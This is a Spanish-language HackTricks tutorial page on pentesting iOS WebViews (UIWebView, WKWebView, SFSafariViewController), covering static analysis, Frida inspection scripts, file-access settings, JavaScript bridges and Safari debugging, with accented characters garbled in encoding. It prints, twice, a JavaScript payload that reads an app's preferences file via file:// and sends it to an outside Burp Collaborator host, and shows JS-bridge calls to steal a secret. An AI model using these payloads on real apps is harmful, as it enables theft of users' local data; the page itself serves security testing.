# iOS WebViews

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Tipos de WebViews

Los WebViews son componentes de navegador integrados en aplicaciones para mostrar **contenido web** interactivo. Se pueden utilizar para incrustar contenido web directamente en la interfaz de usuario de una aplicaci√≥n. Los WebViews de iOS **soportan** la ejecuci√≥n de **JavaScript** **por defecto**, por lo que la inyecci√≥n de scripts y los ataques de Cross-Site Scripting pueden afectarlos.

* [**UIWebView**](https://developer.apple.com/documentation/uikit/uiwebview)**:** UIWebView est√° obsoleto a partir de iOS 12 y no debe utilizarse. **JavaScript no puede ser desactivado**.
* [**WKWebView**](https://developer.apple.com/documentation/webkit/wkwebview): Esta es la opci√≥n adecuada para ampliar la funcionalidad de la aplicaci√≥n, controlando el contenido mostrado.
* **JavaScript** est√° habilitado por defecto, pero gracias a la propiedad **`javaScriptEnabled`** de `WKWebView`, **puede ser completamente desactivado**, previniendo todos los fallos de inyecci√≥n de scripts.
* La propiedad **`JavaScriptCanOpenWindowsAutomatically`** puede ser utilizada para **prevenir** que JavaScript **abra nuevas ventanas**, como pop-ups.
* La propiedad **`hasOnlySecureContent`** puede ser utilizada para verificar que los recursos cargados por el WebView se obtienen a trav√©s de conexiones cifradas.
* `WKWebView` implementa renderizado fuera de proceso, por lo que los **bugs de corrupci√≥n de memoria no afectar√°n** al proceso principal de la aplicaci√≥n.
*   [**SFSafariViewController**](https://developer.apple.com/documentation/safariservices/sfsafariviewcontroller)**:** Debe utilizarse para proporcionar una **experiencia de visualizaci√≥n web generalizada**. Estos WebViews pueden ser f√°cilmente identificados ya que tienen un dise√±o caracter√≠stico que incluye los siguientes elementos:

* Un campo de direcci√≥n de solo lectura con un indicador de seguridad.
* Un bot√≥n de Acci√≥n ("**Compartir**").
* Un **bot√≥n de Hecho**, botones de navegaci√≥n hacia atr√°s y adelante, y un bot√≥n de "Safari" para abrir la p√°gina directamente en Safari.

<img src="https://gblobscdn.gitbook.com/assets%2F-LH00RC4WVf3-6Ou4e0l%2F-Lf1APQHyCHdAvoJSvc_%2F-Lf1AQxr7FPsOyPFSGcs%2Fsfsafariviewcontroller.png?alt=media" alt="" data-size="original">

* **JavaScript no puede ser desactivado** en `SFSafariViewController` y esta es una de las razones por las que se recomienda el uso de `WKWebView` cuando el objetivo es ampliar la interfaz de usuario de la aplicaci√≥n.
* `SFSafariViewController` tambi√©n **comparte cookies** y otros datos de sitios web con **Safari**.
* La actividad e interacci√≥n del usuario con un `SFSafariViewController` **no son visibles para la aplicaci√≥n**, la cual no puede acceder a los datos de AutoFill, historial de navegaci√≥n o datos de sitios web.
* Seg√∫n las Directrices de Revisi√≥n de la App Store, los `SFSafariViewController` **no pueden estar ocultos o ser oscurecidos por otras vistas o capas**.

## Descubriendo la Configuraci√≥n de WebViews

### An√°lisis Est√°tico

**UIWebView**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "UIWebView$"
489 0x0002fee9 0x10002fee9   9  10 (5.__TEXT.__cstring) ascii UIWebView
896 0x0003c813 0x0003c813  24  25 () ascii @_OBJC_CLASS_$_UIWebView
1754 0x00059599 0x00059599  23  24 () ascii _OBJC_CLASS_$_UIWebView
```
**WKWebView**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "WKWebView$"
490 0x0002fef3 0x10002fef3   9  10 (5.__TEXT.__cstring) ascii WKWebView
625 0x00031670 0x100031670  17  18 (5.__TEXT.__cstring) ascii unwindToWKWebView
904 0x0003c960 0x0003c960  24  25 () ascii @_OBJC_CLASS_$_WKWebView
1757 0x000595e4 0x000595e4  23  24 () ascii _OBJC_CLASS_$_WKWebView
```
Alternativamente, tambi√©n puedes buscar m√©todos conocidos de estas clases WebView. Por ejemplo, busca el m√©todo utilizado para inicializar un WKWebView ([`init(frame:configuration:)`](https://developer.apple.com/documentation/webkit/wkwebview/1414998-init)):
```bash
$ rabin2 -zzq ./WheresMyBrowser | egrep "WKWebView.*frame"
0x5c3ac 77 76 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC
0x5d97a 79 78 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO
0x6b5d5 77 76 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC
0x6c3fa 79 78 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO
```
#### Pruebas de Configuraci√≥n de JavaScript

Para `WKWebView`s, como mejor pr√°ctica, JavaScript deber√≠a estar deshabilitado a menos que sea expl√≠citamente necesario. Para verificar que JavaScript fue deshabilitado correctamente, busque en el proyecto usos de `WKPreferences` y aseg√∫rese de que la propiedad [`javaScriptEnabled`](https://developer.apple.com/documentation/webkit/wkpreferences/1536203-javascriptenabled) est√© establecida en `false`:
```
let webPreferences = WKPreferences()
webPreferences.javaScriptEnabled = false
```
Si solo tienes el binario compilado, puedes buscar esto en √©l:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "javascriptenabled"
391 0x0002f2c7 0x10002f2c7  17  18 (4.__TEXT.__objc_methname) ascii javaScriptEnabled
392 0x0002f2d9 0x10002f2d9  21  22 (4.__TEXT.__objc_methname) ascii setJavaScriptEnabled
```
#### Pruebas de OnlySecureContent

A diferencia de `UIWebView`s, al usar `WKWebView`s es posible detectar [contenido mixto](https://developers.google.com/web/fundamentals/security/prevent-mixed-content/fixing-mixed-content?hl=en) (contenido HTTP cargado desde una p√°gina HTTPS). Utilizando el m√©todo [`hasOnlySecureContent`](https://developer.apple.com/documentation/webkit/wkwebview/1415002-hasonlysecurecontent) se puede verificar si todos los recursos de la p√°gina se han cargado a trav√©s de conexiones seguras cifradas.\
En el binario compilado:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "hasonlysecurecontent"
```
Tambi√©n puedes buscar en el c√≥digo fuente o en las cadenas de texto la cadena "http://". Sin embargo, esto no significa necesariamente que haya un problema de contenido mixto. Aprende m√°s sobre contenido mixto en los [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/Security/Mixed\_content).

### An√°lisis Din√°mico

Es posible inspeccionar el mont√≥n de memoria a trav√©s de `ObjC.choose()` para encontrar instancias de los diferentes tipos de WebViews y tambi√©n buscar las propiedades `javaScriptEnabled` y `hasonlysecurecontent`:

{% code title="webviews_inspector.js" %}
```javascript
ObjC.choose(ObjC.classes['UIWebView'], {
onMatch: function (ui) {
console.log('onMatch: ', ui);
console.log('URL: ', ui.request().toString());
},
onComplete: function () {
console.log('done for UIWebView!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});

ObjC.choose(ObjC.classes['SFSafariViewController'], {
onMatch: function (sf) {
console.log('onMatch: ', sf);
},
onComplete: function () {
console.log('done for SFSafariViewController!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('javaScriptEnabled:', wk.configuration().preferences().javaScriptEnabled());
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
}
});
```
```
C√°rgalo con:
```
```bash
frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js

onMatch:  <WKWebView: 0x1508b1200; frame = (0 0; 320 393); layer = <CALayer: 0x1c4238f20>>

hasOnlySecureContent:  false
```
## Manejo del Protocolo WebView

Varios esquemas predeterminados est√°n disponibles y son interpretados en un WebView en iOS, por ejemplo:

* http(s)://
* file://
* tel://

Los WebViews pueden cargar contenido remoto desde un punto final, pero tambi√©n pueden cargar contenido local desde el directorio de datos de la aplicaci√≥n. Si se carga contenido local, el usuario no deber√≠a poder influir en el nombre del archivo o la ruta utilizada para cargar el archivo, y los usuarios no deber√≠an poder editar el archivo cargado.

### Carga de contenido en WebView

* **UIWebView**: Puede usar m√©todos obsoletos [`loadHTMLString:baseURL:`](https://developer.apple.com/documentation/uikit/uiwebview/1617979-loadhtmlstring?language=objc) o [`loadData:MIMEType:textEncodingName:baseURL:`](https://developer.apple.com/documentation/uikit/uiwebview/1617941-loaddata?language=objc) para cargar contenido.
* **WKWebView**: Puede usar los m√©todos [`loadHTMLString:baseURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1415004-loadhtmlstring?language=objc) o [`loadData:MIMEType:textEncodingName:baseURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1415011-loaddata?language=objc) para cargar archivos HTML locales y `loadRequest:` para contenido web. T√≠picamente, los archivos locales se cargan en combinaci√≥n con m√©todos que incluyen, entre otros: [`pathForResource:ofType:`](https://developer.apple.com/documentation/foundation/nsbundle/1410989-pathforresource), [`URLForResource:withExtension:`](https://developer.apple.com/documentation/foundation/nsbundle/1411540-urlforresource?language=objc) o [`init(contentsOf:encoding:)`](https://developer.apple.com/documentation/swift/string/3126736-init). Adem√°s, tambi√©n deber√≠as verificar si la aplicaci√≥n est√° utilizando el m√©todo [`loadFileURL:allowingReadAccessToURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1414973-loadfileurl?language=objc). Su primer par√°metro es `URL` y contiene la URL que se cargar√° en el WebView, su segundo par√°metro `allowingReadAccessToURL` puede contener un solo archivo o un directorio. Si contiene un solo archivo, ese archivo estar√° disponible para el WebView. Sin embargo, si contiene un directorio, todos los archivos en ese **directorio estar√°n disponibles para el WebView**. Por lo tanto, vale la pena inspeccionar esto y en caso de que sea un directorio, verificar que no se pueda encontrar datos sensibles dentro de √©l.

Si tienes el c√≥digo fuente puedes buscar esos m√©todos. Teniendo el **binario** **compilado** tambi√©n puedes buscar estos m√©todos:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "loadHTMLString"
231 0x0002df6c 24 (4.__TEXT.__objc_methname) ascii loadHTMLString:baseURL:
```
### Acceso a Archivos

* **UIWebView:**
* El esquema `file://` siempre est√° habilitado.
* El acceso a archivos desde URLs `file://` siempre est√° habilitado.
* El acceso universal desde URLs `file://` siempre est√° habilitado.
* Si recuperas el origen efectivo de un `UIWebView` donde `baseURL` tambi√©n est√° configurado en `nil`, ver√°s que **no est√° establecido en "null"**, en su lugar obtendr√°s algo similar a lo siguiente: `applewebdata://5361016c-f4a0-4305-816b-65411fc1d780`. Este origen "applewebdata://" es similar al origen "file://" ya que **no implementa la Pol√≠tica de Mismo Origen** y permite el acceso a archivos locales y cualquier recurso web.

{% tabs %}
{% tab title="exfiltrate_file" %}
```javascript
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
{% endtab %}
{% endtabs %}

* **WKWebView**:
* **`allowFileAccessFromFileURLs`** (`WKPreferences`, `false` por defecto): permite que JavaScript ejecutado en el contexto de una URL con esquema `file://` acceda a contenido de otras URLs con esquema `file://`.
* **`allowUniversalAccessFromFileURLs`** (`WKWebViewConfiguration`, `false` por defecto): permite que JavaScript ejecutado en el contexto de una URL con esquema `file://` acceda a contenido de cualquier origen.

Puedes buscar estas funciones en el c√≥digo fuente de la aplicaci√≥n o en el binario compilado.\
Tambi√©n, puedes usar el siguiente script de frida para encontrar esta informaci√≥n:
```bash
ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
console.log('javaScriptEnabled: ', wk.configuration().preferences().javaScriptEnabled());
console.log('allowFileAccessFromFileURLs: ',
wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
console.log('allowUniversalAccessFromFileURLs: ',
wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});
```

```bash
frida -U -f com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js

onMatch:  <WKWebView: 0x1508b1200; frame = (0 0; 320 393); layer = <CALayer: 0x1c4238f20>>
URL:  file:///var/mobile/Containers/Data/Application/A654D169-1DB7-429C-9DB9-A871389A8BAA/
Library/WKWebView/scenario1.html
javaScriptEnabled:  true
allowFileAccessFromFileURLs:  0
hasOnlySecureContent:  false
allowUniversalAccessFromFileURLs:  0
```
#### Exfiltraci√≥n de archivos arbitrarios
```javascript
//For some reason this payload doesn't work!!
//Let me know if you know how to exfiltrate local files from a WKWebView
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
## M√©todos Nativos Expuestos a trav√©s de WebViews

Desde iOS 7, Apple introdujo APIs que permiten **comunicaci√≥n entre el entorno de ejecuci√≥n de JavaScript en el WebView y los objetos nativos** Swift o Objective-C.

Hay dos formas fundamentales de c√≥mo el c√≥digo nativo y JavaScript pueden comunicarse:

* **JSContext**: Cuando un bloque de Objective-C o Swift se asigna a un identificador en un `JSContext`, JavaScriptCore autom√°ticamente envuelve el bloque en una funci√≥n de JavaScript.
* **Protocolo JSExport**: Las propiedades, m√©todos de instancia y m√©todos de clase declarados en un protocolo heredado de `JSExport` se mapean a objetos de JavaScript que est√°n disponibles para todo el c√≥digo JavaScript. Las modificaciones de objetos que est√°n en el entorno de JavaScript se reflejan en el entorno nativo.

Nota que **solo los miembros de clase definidos en el protocolo `JSExport`** son accesibles al c√≥digo JavaScript.\
Presta atenci√≥n al c√≥digo que mapea objetos nativos al `JSContext` asociado con un WebView y analiza qu√© funcionalidad expone, por ejemplo, no se deben poder acceder ni exponer datos sensibles a trav√©s de WebViews.\
En Objective-C, el `JSContext` asociado con un `UIWebView` se obtiene de la siguiente manera:
```objectivec
[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]
```
El c√≥digo JavaScript en un **`WKWebView` a√∫n puede enviar mensajes de vuelta a la aplicaci√≥n nativa, pero a diferencia de `UIWebView`, no es posible hacer referencia directamente al `JSContext`** de un `WKWebView`. En su lugar, la comunicaci√≥n se implementa utilizando un sistema de mensajer√≠a y usando la funci√≥n `postMessage`, que serializa autom√°ticamente objetos JavaScript en objetos nativos de Objective-C o Swift. Los manejadores de mensajes se configuran utilizando el m√©todo [`add(_ scriptMessageHandler:name:)`](https://developer.apple.com/documentation/webkit/wkusercontentcontroller/1537172-add).

### Habilitando JavascriptBridge
```swift
func enableJavaScriptBridge(_ enabled: Bool) {
options_dict["javaScriptBridge"]?.value = enabled
let userContentController = wkWebViewConfiguration.userContentController
userContentController.removeScriptMessageHandler(forName: "javaScriptBridge")

if enabled {
let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()
userContentController.add(javaScriptBridgeMessageHandler, name: "javaScriptBridge")
}
}
```
### Enviando Mensaje

Agregar un manejador de mensajes de script con el nombre `"name"` (o `"javaScriptBridge"` en el ejemplo anterior) hace que la funci√≥n JavaScript `window.webkit.messageHandlers.myJavaScriptMessageHandler.postMessage` se defina en todos los marcos en todas las vistas web que usan el controlador de contenido del usuario. Luego, [puede usarse desde el archivo HTML de esta manera](https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/d4e2d9efbde8841bf7e4a8800418dda6bb116ec6/WheresMyBrowser/web/WKWebView/scenario3.html#L33):
```javascript
function invokeNativeOperation() {
value1 = document.getElementById("value1").value
value2 = document.getElementById("value2").value
window.webkit.messageHandlers.javaScriptBridge.postMessage(["multiplyNumbers", value1, value2]);
}
//After testing the previos funtion I got the error TypeError: undefined is not an object (evaluating 'window.webkit.messageHandlers')
//But the following code worked to call the exposed javascriptbridge with the args "addNumbers", "1", "2"

document.location = "javascriptbridge://addNumbers/" + 1 + "/" + 2
```
Una vez que la funci√≥n Nativa se ejecuta, normalmente **ejecutar√° algo de JavaScript dentro de la p√°gina web** (ver `evaluateJavascript` abajo), podr√≠as estar interesado en **sobrescribir la funci√≥n** que se va a ejecutar para **robar el resultado**.\
Por ejemplo, en el script a continuaci√≥n, la funci√≥n **`javascriptBridgeCallBack`** se va a ejecutar con 2 par√°metros (la funci√≥n llamada y el **resultado**). Si controlas el HTML que se va a cargar, puedes crear una **alerta con el resultado** como:
```markup
<html>
<script>
document.location = "javascriptbridge://getSecret"
function javascriptBridgeCallBack(name, result) {
alert(result);
}
</script>
</html>
```
### Funci√≥n Llamada

La funci√≥n llamada reside en [`JavaScriptBridgeMessageHandler.swift`](https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/b8d4abda4000aa509c7a5de79e5c90360d1d0849/WheresMyBrowser/JavaScriptBridgeMessageHandler.swift#L29):
```swift
class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {

//...

case "multiplyNumbers":

let arg1 = Double(messageArray[1])!
let arg2 = Double(messageArray[2])!
result = String(arg1 * arg2)
//...

let javaScriptCallBack = "javascriptBridgeCallBack('\(functionFromJS)','\(result)')"
message.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)
```
### Pruebas

Para probar el env√≠o de un postMessage dentro de una aplicaci√≥n, puedes:

* Cambiar la respuesta del servidor (MitM)
* Realizar una instrumentaci√≥n din√°mica e inyectar el payload de JavaScript utilizando frameworks como Frida y las correspondientes funciones de evaluaci√≥n de JavaScript disponibles para los iOS WebViews ([`stringByEvaluatingJavaScriptFromString:`](https://developer.apple.com/documentation/uikit/uiwebview/1617963-stringbyevaluatingjavascriptfrom?language=objc) para `UIWebView` y [`evaluateJavaScript:completionHandler:`](https://developer.apple.com/documentation/webkit/wkwebview/1415017-evaluatejavascript?language=objc) para `WKWebView`).

## Depuraci√≥n de iOS WebViews

(Tutorial de [https://blog.vuplex.com/debugging-webviews](https://blog.vuplex.com/debugging-webviews))

En los iOS webviews, los mensajes enviados a `console.log()` _no_ se imprimen en los registros de Xcode. A√∫n as√≠, es relativamente f√°cil depurar contenido web con las herramientas de desarrollador de Safari, aunque hay un par de limitaciones:

* La depuraci√≥n de iOS webviews requiere Safari, por lo que tu computadora de desarrollo debe estar ejecutando macOS.
* Solo puedes depurar webviews en aplicaciones cargadas en tu dispositivo a trav√©s de Xcode. No puedes depurar webviews en aplicaciones instaladas a trav√©s de la App Store o Apple Configurator.

Con esas limitaciones en mente, aqu√≠ est√°n los pasos para depurar remotamente un webview en iOS:

* Primero, habilita el Inspector Web de Safari en tu dispositivo iOS abriendo la aplicaci√≥n _Configuraci√≥n_ de iOS, navegando a **Configuraci√≥n > Safari > Avanzado**, y activando la opci√≥n _Inspector Web_.

![Configuraci√≥n de Safari en iOS](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/ios-safari-settings.jpg)

* A continuaci√≥n, tambi√©n debes habilitar las herramientas de desarrollador en Safari en tu computadora de desarrollo. Inicia Safari en tu m√°quina de desarrollo y navega a **Safari > Preferencias** en la barra de men√∫. En el panel de preferencias que aparece, haz clic en la pesta√±a _Avanzado_ y luego activa la opci√≥n _Mostrar men√∫ Desarrollo_ en la parte inferior. Despu√©s de hacerlo, puedes cerrar el panel de preferencias.

![Configuraci√≥n de Safari en Mac](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-settings.jpg)

* Conecta tu dispositivo iOS a tu computadora de desarrollo y lanza tu aplicaci√≥n.
* En Safari en tu computadora de desarrollo, haz clic en _Desarrollo_ en la barra de men√∫ y pasa el cursor sobre la opci√≥n desplegable que es el nombre de tu dispositivo iOS para mostrar una lista de instancias de webview ejecut√°ndose en tu dispositivo iOS.

![Men√∫ de desarrollo de Safari en Mac](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-develop-menu.jpg)

* Haz clic en la opci√≥n desplegable para el webview que deseas depurar. Esto abrir√° una nueva ventana del Inspector Web de Safari para inspeccionar el webview.

![Ventana del Inspector Web de Safari](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-inspector.jpg)

## Referencias

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6)
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
